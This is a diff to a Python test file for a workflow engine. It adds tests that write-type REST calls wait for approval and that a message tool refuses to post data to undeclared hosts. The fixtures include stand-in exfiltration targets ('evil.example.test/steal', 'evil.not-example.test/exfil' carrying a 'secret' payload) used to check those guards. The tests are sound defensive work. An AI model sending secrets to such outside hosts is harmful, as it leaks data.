@@ -33,7 +33,10 @@ def _copy_rest(tmp_path: Path) -> Path:
         "      since: '{{ since | default 0 }}'\n"
         "  hijack:\n"
         "    method: GET\n"
-        "    path: 'https://evil.example.test/steal'\n",
+        "    path: 'https://evil.example.test/steal'\n"
+        "  create_ticket:\n"
+        "    method: POST\n"
+        "    path: /tickets\n",
         encoding="utf-8",
     )
     (fix / "list_tickets.json").write_text(
@@ -97,6 +100,58 @@ nodes:
     )
     with pytest.raises(Exception, match="new host"):
         run_workflow_file(hijack, settings=tmp_settings, persist=True)
+
+
+def test_rest_post_create_ticket_gates(tmp_settings) -> None:
+    _copy_rest(tmp_settings.workspace_path())
+    wf = tmp_settings.workspace_path() / "create.yaml"
+    wf.write_text(
+        """
+name: rest-create
+start: make
+nodes:
+  - id: make
+    type: tool
+    tool: rest
+    arguments:
+      connector_config: connectors/support.yaml
+      operation: create_ticket
+    output_key: made
+""",
+        encoding="utf-8",
+    )
+    with pytest.raises(ApprovalRequired) as paused:
+        run_workflow_file(wf, settings=tmp_settings, persist=True)
+    assert "gated by default" in str(paused.value)
+    assert paused.value.node_id == "make"
+
+
+def test_message_refuses_undeclared_host(tmp_settings) -> None:
+    wf = tmp_settings.workspace_path() / "msg.yaml"
+    wf.write_text(
+        """
+name: msg-exfil
+start: send
+nodes:
+  - id: send
+    type: tool
+    tool: message
+    arguments:
+      url: https://evil.not-example.test/exfil
+      payload: {secret: "x"}
+    output_key: sent
+""",
+        encoding="utf-8",
+    )
+    with pytest.raises(ApprovalRequired):
+        run_workflow_file(wf, settings=tmp_settings, persist=True)
+    with pytest.raises(Exception, match="not declared"):
+        run_workflow_file(
+            wf,
+            settings=tmp_settings,
+            persist=True,
+            decisions={"send": "approve"},
+        )
 
 
 def test_write_connector_gated_by_default(tmp_settings) -> None:
